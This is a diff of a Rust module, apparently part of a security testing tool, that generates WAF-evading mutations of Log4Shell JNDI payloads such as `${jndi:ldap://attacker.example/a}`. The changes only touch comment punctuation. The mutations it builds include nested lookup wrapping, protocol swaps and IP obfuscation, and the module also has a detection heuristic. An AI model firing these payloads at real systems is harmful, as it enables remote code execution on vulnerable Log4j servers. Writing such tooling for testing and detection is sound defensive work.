@@ -1,7 +1,7 @@
 //! JNDI/Log4Shell grammar-aware payload mutation.
 //!
 //! Generates semantically-equivalent variants of JNDI lookup injection
-//! payloads — `${jndi:ldap://attacker.example/a}` and friends.
+//! payloads: `${jndi:ldap://attacker.example/a}` and friends.
 //! Log4j's lookup-substitution engine recurses through `${…}` expressions
 //! before resolving the outermost JNDI reference, so wrapping any character
 //! in `${lower:x}`, `${upper:x}`, `${env:NaN:-x}`, etc. produces a string
@@ -9,25 +9,25 @@
 //!
 //! # Supported envelope forms
 //!
-//! - `${jndi:ldap://…}` — canonical Log4Shell vector
-//! - `${jndi:ldaps://…}` — LDAP-over-TLS; semantically identical
-//! - `${jndi:rmi://…}` — Java RMI protocol
-//! - `${jndi:dns://…}` — DNS lookup (OOB detection even when LDAP blocked)
-//! - `${jndi:iiop://…}` — CORBA IIOP
-//! - `${jndi:corba://…}` — CORBA (alias for iiop in many JDKs)
+//! - `${jndi:ldap://…}`: canonical Log4Shell vector
+//! - `${jndi:ldaps://…}`: LDAP-over-TLS; semantically identical
+//! - `${jndi:rmi://…}`: Java RMI protocol
+//! - `${jndi:dns://…}`: DNS lookup (OOB detection even when LDAP blocked)
+//! - `${jndi:iiop://…}`: CORBA IIOP
+//! - `${jndi:corba://…}`: CORBA (alias for iiop in many JDKs)
 //!
 //! # Mutation strategies
 //!
-//! 1. **Character-level wrapping** — each character of `jndi` wrapped in
+//! 1. **Character-level wrapping**: each character of `jndi` wrapped in
 //!    `${lower:x}`, `${upper:x}`, `${${::-x}}` (default-value trick)
-//! 2. **Environment-variable default** — `${env:NaN:-x}` substitutes when
+//! 2. **Environment-variable default**: `${env:NaN:-x}` substitutes when
 //!    the env var is absent; the default value feeds the outer lookup
-//! 3. **System-property default** — `${sys:nonexistent:-x}` variant
-//! 4. **Date-format literal** — `${date:'x'}` injects a literal character
+//! 3. **System-property default**: `${sys:nonexistent:-x}` variant
+//! 4. **Date-format literal**: `${date:'x'}` injects a literal character
 //!    via log4j's date pattern parser
-//! 5. **Protocol swap** — ldap → ldaps / rmi / dns / iiop / corba cycling
-//! 6. **Host obfuscation** — decimal IP, hex IP, octal IP representations
-//! 7. **Nested recursion** — wrap the entire `jndi` prefix in a chain of
+//! 5. **Protocol swap**: ldap → ldaps / rmi / dns / iiop / corba cycling
+//! 6. **Host obfuscation**: decimal IP, hex IP, octal IP representations
+//! 7. **Nested recursion**: wrap the entire `jndi` prefix in a chain of
 //!    `${lower:…}` lookups so no substring of the wire form reads `jndi`
 
 use std::collections::HashSet;
@@ -40,7 +40,7 @@ pub const JNDI_PROTOCOLS: &[&str] = &["ldap", "ldaps", "rmi", "dns", "iiop", "co
 
 /// Generate semantic-preserving JNDI mutations for a candidate payload.
 ///
-/// Returns an empty `Vec` for non-JNDI inputs — the caller is expected to
+/// Returns an empty `Vec` for non-JNDI inputs, the caller is expected to
 /// have already confirmed the payload is JNDI via [`detect_type`] before
 /// dispatching here. Passing a non-JNDI payload returns `[]` (no panic).
 #[must_use]
@@ -77,7 +77,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
         Some(r) => r, // e.g. `ldap://attacker.example/a`
         None => {
             // Already-obfuscated form (${${lower:j}ndi:…}); can't safely
-            // parse further — emit encoding-only variants.
+            // parse further (emit encoding-only variants).
             push(obfuscate_dollars(trimmed));
             return out;
         }
@@ -95,16 +95,16 @@ pub fn mutate(payload: &str) -> Vec<String> {
     // Wrap each character of "jndi" in a lookup substitution so no
     // contiguous substring of the output reads `jndi`. Three forms:
 
-    // ${lower:x} — passthrough (lower:j = j, so this works for j,n,d,i)
+    // ${lower:x}, passthrough (lower:j = j, so this works for j,n,d,i)
     let lower_wrap: String = "jndi".chars().map(|c| format!("${{lower:{c}}}")).collect();
     push(format!("${{{lower_wrap}:{proto_host}}}"));
 
-    // ${upper:x} — same principle; result is uppercase letters but log4j
+    // ${upper:x}, same principle; result is uppercase letters but log4j
     // resolves case-insensitively for the `jndi` lookup prefix.
     let upper_wrap: String = "jndi".chars().map(|c| format!("${{upper:{c}}}")).collect();
     push(format!("${{{upper_wrap}:{proto_host}}}"));
 
-    // ${::-x} default-value trick — `${::-j}` has empty variable name so
+    // ${::-x} default-value trick: `${::-j}` has empty variable name so
     // always resolves to the default value `j`.
     let default_wrap: String = "jndi".chars().map(|c| format!("${{::-{c}}}")).collect();
     push(format!("${{{default_wrap}:{proto_host}}}"));
@@ -145,7 +145,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
     push(format!("${{::-$}}{{jndi:{proto_host}}}"));
 
     // ── 8. Mixed-case jndi prefix ────────────────────────────────────
-    // Some WAF rules match on literal `jndi` — capitalize first letter.
+    // Some WAF rules match on literal `jndi`: capitalize first letter.
     push(format!("${{Jndi:{proto_host}}}"));
     push(format!("${{JNDI:{proto_host}}}"));
 
@@ -169,7 +169,7 @@ pub fn mutate(payload: &str) -> Vec<String> {
 ///
 /// Only fires when the host is a dotted-quad IPv4 address or `localhost`.
 /// For domain names we leave it as-is (domain obfuscation is DNS-level, not
-/// our concern here — we'd need DNS resolution to build equivalents).
+/// our concern here (we'd need DNS resolution to build equivalents)).
 fn push_host_obfuscations(host_path: &str, proto: &str, push: &mut impl FnMut(String)) {
     // Extract just the host (everything before first `/`)
     let host = host_path.split('/').next().unwrap_or(host_path);
@@ -189,7 +189,7 @@ fn push_host_obfuscations(host_path: &str, proto: &str, push: &mut impl FnMut(St
         .filter_map(|s| s.parse::<u8>().ok())
         .collect();
     if octets.len() != 4 {
-        return; // Not a dotted-quad — leave as-is
+        return; // Not a dotted-quad, leave as-is
     }
 
     let decimal = octets
@@ -235,13 +235,13 @@ pub fn detect_type(payload: &str) -> bool {
         return true;
     }
     // Obfuscated form: outer `${` that leads to a nested `jndi` resolution.
-    // This includes `${${lower:j}ndi:…}` and `${${::-j}${::-n}…}` — they
+    // This includes `${${lower:j}ndi:…}` and `${${::-j}${::-n}…}`: they
     // all start with `${` and the inner content reconstructs `jndi`.
     // Heuristic: outer envelope is `${…}` and inner contains `ndi:` with
     // at least one lookup substitution before it.
     if lower.starts_with("${") && lower.ends_with('}') {
         let inner = &lower[2..lower.len() - 1];
-        // Inner contains a lookup wrapper before `ndi:` — this is a split-jndi form.
+        // Inner contains a lookup wrapper before `ndi:`: this is a split-jndi form.
         if (inner.contains("lower:j")
             || inner.contains("upper:j")
             || inner.contains("::-j")
@@ -485,7 +485,7 @@ mod tests {
     /// Mutations that encode the `$` / `{` characters must still be
     /// detectable as JNDI by the detection heuristic (they're a mutated
     /// form of a JNDI payload, not raw ones). The obfuscate_dollars helper
-    /// produces URL-encoded forms — those are accepted as benign by detect_type
+    /// produces URL-encoded forms, those are accepted as benign by detect_type
     /// (which looks for the raw `${jndi:` sequence) but represent real threats.
     /// This test confirms the helper does not panic.
     #[test]
